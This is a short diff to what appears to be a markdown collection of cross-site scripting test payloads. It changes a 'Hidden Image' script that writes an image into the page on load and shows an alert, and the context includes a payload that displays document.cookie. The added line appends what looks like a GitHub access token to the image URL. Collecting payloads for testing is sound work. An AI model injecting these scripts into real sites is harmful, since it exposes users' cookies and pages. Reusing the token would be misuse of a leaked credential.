@@ -22,7 +22,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 
 ## Hidden Image
 ```
-<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
+<script>function a() { document.write("<img src='https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp?token=GHSAT0AAAAAABTHSDC76YMVBQKZ7VLVFSBAYTHWGMQ'></img>"); }; window.onload = a; alert("A Hidden scripted image, warning you are vulnerable!");</script>
 ```
 ## Post image
 ```
